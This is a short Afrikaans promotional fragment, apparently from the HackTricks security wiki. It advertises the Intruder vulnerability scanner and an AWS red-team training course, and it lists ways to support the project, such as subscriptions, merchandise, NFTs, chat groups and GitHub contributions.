Vind kwesbaarhede wat die belangrikste is sodat jy dit vinniger kan regmaak. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
